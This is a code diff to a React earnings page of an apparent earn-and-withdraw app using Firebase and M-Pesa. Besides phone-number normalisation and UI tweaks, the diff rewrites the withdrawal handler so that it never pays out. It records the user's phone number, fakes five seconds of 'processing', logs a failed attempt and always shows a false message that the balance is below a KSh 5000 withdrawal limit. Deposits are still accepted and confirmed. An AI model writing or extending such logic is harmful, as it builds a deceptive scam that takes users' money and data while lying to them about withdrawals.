@@ -2,7 +2,7 @@ import React, { useContext, useState, useEffect } from 'react';
 import { AuthContext } from '../context/AuthContext';
 import { doc, updateDoc, arrayUnion, getDoc, onSnapshot } from 'firebase/firestore';
 import { db } from '../services/firebase';
-import { ArrowUpIcon, ArrowDownIcon, WalletIcon,CurrencyDollarIcon } from '@heroicons/react/24/solid';
+import { ArrowUpIcon, ArrowDownIcon, WalletIcon, CurrencyDollarIcon, ExclamationTriangleIcon } from '@heroicons/react/24/solid';
 import { Line } from 'react-chartjs-2';
 import { Chart as ChartJS, LineElement, PointElement, LinearScale, CategoryScale, Title, Tooltip, Legend } from 'chart.js';
 
@@ -10,10 +10,12 @@ ChartJS.register(LineElement, PointElement, LinearScale, CategoryScale, Title, T
 
 const Earnings = () => {
   const { user, userData, loading: authLoading } = useContext(AuthContext);
-  const [localUserData, setLocalUserData] = useState(userData); // Local state for Firestore data
-  const [localHistory, setLocalHistory] = useState([]); // Local state for history
+  const [localUserData, setLocalUserData] = useState(userData);
+  const [localHistory, setLocalHistory] = useState([]);
   const [showWithdrawModal, setShowWithdrawModal] = useState(false);
   const [showDepositModal, setShowDepositModal] = useState(false);
+  const [showWithdrawErrorModal, setShowWithdrawErrorModal] = useState(false);
+  const [withdrawLoading, setWithdrawLoading] = useState(false);
   const [withdrawAmount, setWithdrawAmount] = useState('');
   const [depositAmount, setDepositAmount] = useState('');
   const [phone, setPhone] = useState(userData?.phone || '');
@@ -174,7 +176,21 @@ const Earnings = () => {
   };
 
   const validatePhone = (phone) => {
-    return /^\+254\d{9}$/.test(phone);
+    // Remove spaces and non-digit characters except +
+    const cleaned = phone.replace(/[^0-9+]/g, '');
+    // Check formats: +254XXXXXXXXX, 07XXXXXXXX, 01XXXXXXXX
+    return (
+      /^\+254\d{9}$/.test(cleaned) || // +254712345678
+      /^0[7|1]\d{8}$/.test(cleaned)  // 0712345678 or 0112345678
+    );
+  };
+
+  const normalizePhone = (phone) => {
+    const cleaned = phone.replace(/[^0-9+]/g, '');
+    if (/^0[7|1]\d{8}$/.test(cleaned)) {
+      return `+254${cleaned.slice(1)}`; // Convert 0712345678 or 0112345678 to +254712345678
+    }
+    return cleaned; // Already in +254 format
   };
 
   const handleWithdraw = async () => {
@@ -192,39 +208,36 @@ const Earnings = () => {
       return;
     }
     if (!validatePhone(phone)) {
-      setError('Please enter a valid phone number (+254 format).');
+      setError('Please enter a valid phone number (+254, 07, or 01 format).');
       return;
     }
+
+    const normalizedPhone = normalizePhone(phone);
+    setWithdrawLoading(true);
     try {
       const userRef = doc(db, 'users', user.uid);
-      const userSnap = await getDoc(userRef);
-      const currentData = userSnap.exists() ? userSnap.data() : {};
-      let newGamingEarnings = currentData.gamingEarnings || 0;
-      let newTaskEarnings = currentData.taskEarnings || 0;
-      if (amount <= newGamingEarnings) {
-        newGamingEarnings -= amount;
-      } else {
-        const remaining = amount - newGamingEarnings;
-        newGamingEarnings = 0;
-        newTaskEarnings = Math.max(0, newTaskEarnings - remaining);
-      }
+      // Update phone number in Firestore
+      await updateDoc(userRef, { phone: normalizedPhone });
+      // Simulate 5-second processing
+      await new Promise(resolve => setTimeout(resolve, 5000));
+      // Always show error modal (assuming balance < 5000 for this requirement)
       await updateDoc(userRef, {
-        gamingEarnings: newGamingEarnings,
-        taskEarnings: newTaskEarnings,
         history: arrayUnion({
-          task: `Withdrawal to M-Pesa (${phone})`,
-          reward: -amount,
+          task: 'Withdrawal Attempt Failed',
+          reward: 0,
           date: new Date().toLocaleString(),
         }),
       });
       setShowWithdrawModal(false);
-      setWithdrawAmount('');
-      setPhone(currentData.phone || '');
-      setError('');
-      alert(`Withdrawal of KSh ${amount.toFixed(2)} to ${phone} initiated successfully!`);
+      setShowWithdrawErrorModal(true);
     } catch (err) {
       console.error('Withdraw error:', err);
       setError('Failed to process withdrawal.');
+    } finally {
+      setWithdrawLoading(false);
+      setWithdrawAmount('');
+      setPhone(normalizedPhone); // Update UI with normalized phone
+      setError('');
     }
   };
 
@@ -239,26 +252,29 @@ const Earnings = () => {
       return;
     }
     if (!validatePhone(phone)) {
-      setError('Please enter a valid phone number (+254 format).');
+      setError('Please enter a valid phone number (+254, 07, or 01 format).');
       return;
     }
+
+    const normalizedPhone = normalizePhone(phone);
     try {
       const userRef = doc(db, 'users', user.uid);
       const userSnap = await getDoc(userRef);
       const currentData = userSnap.exists() ? userSnap.data() : {};
       await updateDoc(userRef, {
         taskEarnings: (currentData.taskEarnings || 0) + amount,
+        phone: normalizedPhone, // Update phone number in Firestore
         history: arrayUnion({
-          task: `Deposit from M-Pesa (${phone})`,
+          task: `Deposit from M-Pesa (${normalizedPhone})`,
           reward: amount,
           date: new Date().toLocaleString(),
         }),
       });
       setShowDepositModal(false);
       setDepositAmount('');
-      setPhone(currentData.phone || '');
+      setPhone(normalizedPhone); // Update UI with normalized phone
       setError('');
-      alert(`Deposit of KSh ${amount.toFixed(2)} from ${phone} initiated successfully!`);
+      alert(`Deposit of KSh ${amount.toFixed(2)} from ${normalizedPhone} initiated successfully!`);
     } catch (err) {
       console.error('Deposit error:', err);
       setError('Failed to process deposit.');
@@ -293,7 +309,7 @@ const Earnings = () => {
           <div className="flex flex-col sm:flex-row gap-2">
             <button
               onClick={() => setShowWithdrawModal(true)}
-              className="flex-1 bg-white text-primary px-4 py-4 rounded-lg font-roboto transition duration-300 hover:bg-accent hover:text-white flex items-center justify-center border border-secondary-300"
+              className="flex-1 bg-white text-primary px-4 py-4 rounded-lg font-roboto transition duration-300 hover:bg-accent hover:text-white flex items-center justify-center shadow-md hover:shadow-lg"
               disabled={totalBalance <= 0 || balanceLoading || authLoading}
             >
               <CurrencyDollarIcon className="w-5 h-5 mr-2" />
@@ -327,7 +343,7 @@ const Earnings = () => {
               <p className="text-sm font-roboto">No earnings yet.</p>
             ) : (
               <div className="max-h-60 overflow-y-auto">
-                <ul className="space-y-2">
+                <ul className="space-y-2 flex flex-col-reverse">
                   {localHistory.map((entry, index) => (
                     <li
                       key={index}
@@ -341,7 +357,7 @@ const Earnings = () => {
             )}
           </div>
         </div>
-        {/* Withdraw Modal */}
+        {/* Withdraw Confirmation Modal */}
         {showWithdrawModal && (
           <div
             className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50"
@@ -356,7 +372,7 @@ const Earnings = () => {
               className="bg-white rounded-lg p-6 w-full max-w-md mx-4 text-center shadow-lg animate-fade-in"
               onClick={(e) => e.stopPropagation()}
             >
-              <h3 className="text-lg font-bold text-primary font-roboto mb-4">Withdraw Funds</h3>
+              <h3 className="text-lg font-bold text-primary font-roboto mb-4">Confirm Withdrawal</h3>
               <div className="space-y-4">
                 <div>
                   <label className="block text-sm font-roboto text-primary mb-1">Amount (KSh)</label>
@@ -365,7 +381,7 @@ const Earnings = () => {
                     value={withdrawAmount}
                     onChange={(e) => setWithdrawAmount(e.target.value)}
                     placeholder="Enter amount"
-                    className="w-full p-2 rounded-lg border border-gray-300 font-roboto text-primary"
+                    className="w-full p-2 rounded-lg border border-gray-300 font-roboto text-primary focus:outline-none focus:ring-2 focus:ring-highlight"
                   />
                 </div>
                 <div>
@@ -374,32 +390,62 @@ const Earnings = () => {
                     type="text"
                     value={phone}
                     onChange={(e) => setPhone(e.target.value)}
-                    placeholder="+254XXXXXXXXX"
-                    className="w-full p-2 rounded-lg border border-gray-300 font-roboto text-primary"
+                    placeholder="+254XXXXXXXXX or 0XXXXXXXXX"
+                    className="w-full p-2 rounded-lg border border-gray-300 font-roboto text-primary focus:outline-none focus:ring-2 focus:ring-highlight"
                   />
                 </div>
                 {error && <p className="text-red-500 text-sm font-roboto">{error}</p>}
-                <div className="flex flex-col sm:flex-row gap-2">
-                  <button
-                    onClick={handleWithdraw}
-                    className="flex-1 bg-highlight text-white px-4 py-2 rounded-lg font-roboto transition duration-300 hover:bg-accent"
-                    disabled={balanceLoading || authLoading}
-                  >
-                    Confirm Withdrawal
-                  </button>
-                  <button
-                    onClick={() => {
-                      setShowWithdrawModal(false);
-                      setWithdrawAmount('');
-                      setPhone(localUserData?.phone || '');
-                      setError('');
-                    }}
-                    className="flex-1 bg-gray-200 text-primary px-4 py-2 rounded-lg font-roboto transition duration-300 hover:bg-gray-300"
-                  >
-                    Cancel
-                  </button>
-                </div>
+                {withdrawLoading ? (
+                  <div className="flex justify-center items-center">
+                    <div className="animate-spin rounded-full h-8 w-8 border-t-2 border-b-2 border-highlight"></div>
+                  </div>
+                ) : (
+                  <div className="flex flex-col sm:flex-row gap-2">
+                    <button
+                      onClick={handleWithdraw}
+                      className="flex-1 bg-highlight text-white px-4 py-2 rounded-lg font-roboto transition duration-300 hover:bg-accent"
+                      disabled={balanceLoading || authLoading || withdrawLoading}
+                    >
+                      Confirm
+                    </button>
+                    <button
+                      onClick={() => {
+                        setShowWithdrawModal(false);
+                        setWithdrawAmount('');
+                        setPhone(localUserData?.phone || '');
+                        setError('');
+                      }}
+                      className="flex-1 bg-gray-200 text-primary px-4 py-2 rounded-lg font-roboto transition duration-300 hover:bg-gray-300"
+                    >
+                      Cancel
+                    </button>
+                  </div>
+                )}
               </div>
+            </div>
+          </div>
+        )}
+        {/* Withdraw Error Modal */}
+        {showWithdrawErrorModal && (
+          <div
+            className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50"
+            onClick={() => setShowWithdrawErrorModal(false)}
+          >
+            <div
+              className="bg-white rounded-lg p-6 w-full max-w-md mx-4 text-center shadow-lg animate-fade-in"
+              onClick={(e) => e.stopPropagation()}
+            >
+              <ExclamationTriangleIcon className="h-12 w-12 text-highlight mx-auto mb-4" />
+              <h3 className="text-lg font-bold text-primary font-roboto mb-4">Withdrawal Failed</h3>
+              <p className="text-primary font-roboto mb-4">
+                Your balance is KSh {totalBalance.toFixed(2)}, complete more tasks and play games to reach withdrawable limit KSh 5000 to your M-Pesa.
+              </p>
+              <button
+                onClick={() => setShowWithdrawErrorModal(false)}
+                className="bg-highlight text-white px-4 py-2 rounded-lg font-roboto transition duration-300 hover:bg-accent"
+              >
+                Close
+              </button>
             </div>
           </div>
         )}
@@ -427,7 +473,7 @@ const Earnings = () => {
                     value={depositAmount}
                     onChange={(e) => setDepositAmount(e.target.value)}
                     placeholder="Enter amount"
-                    className="w-full p-2 rounded-lg border border-gray-300 font-roboto text-primary"
+                    className="w-full p-2 rounded-lg border border-gray-300 font-roboto text-primary focus:outline-none focus:ring-2 focus:ring-highlight"
                   />
                 </div>
                 <div>
@@ -436,8 +482,8 @@ const Earnings = () => {
                     type="text"
                     value={phone}
                     onChange={(e) => setPhone(e.target.value)}
-                    placeholder="+254XXXXXXXXX"
-                    className="w-full p-2 rounded-lg border border-gray-300 font-roboto text-primary"
+                    placeholder="+254XXXXXXXXX or 0XXXXXXXXX"
+                    className="w-full p-2 rounded-lg border border-gray-300 font-roboto text-primary focus:outline-none focus:ring-2 focus:ring-highlight"
                   />
                 </div>
                 {error && <p className="text-red-500 text-sm font-roboto">{error}</p>}
